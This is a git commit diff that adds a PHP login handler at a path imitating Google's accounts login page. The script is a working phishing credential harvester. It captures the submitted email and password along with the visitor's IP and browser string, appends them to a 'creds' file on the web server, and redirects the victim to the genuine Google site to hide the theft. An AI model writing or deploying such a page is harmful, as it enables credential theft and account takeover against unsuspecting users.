8b0908f9af8d3542910afc095514ed5dcbe114a2
Spencer Heywood <l.spencer.heywood@gmail.com>
2018-10-26 15:58:56 -0600

    added google web page

---
+++ accounts.google.com/login.php
@@ -0,0 +1,18 @@
+<?php
+$webpage = "accounts.google.com";
+$user = $_POST['Email'];
+$pass = $_POST['Password'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$browser = $_SERVER['HTTP_USER_AGENT'];
+date_default_timezone_set("America/Denver");
+$myfile = fopen("/var/www/html/creds/creds.html", "a") or die("Unable to open file!");
+fwrite($myfile,date("Y-m-d h:i:sa"));
+fwrite($myfile,": ".$webpage);
+fwrite($myfile,": ".$ip);
+fwrite($myfile," --- ".$user);
+fwrite($myfile," --- ".$pass);
+fwrite($myfile," --- ".$browser);
+fwrite($myfile,"\n");
+fclose($myfile);
+header('Location: https://accounts.google.com');
+?>
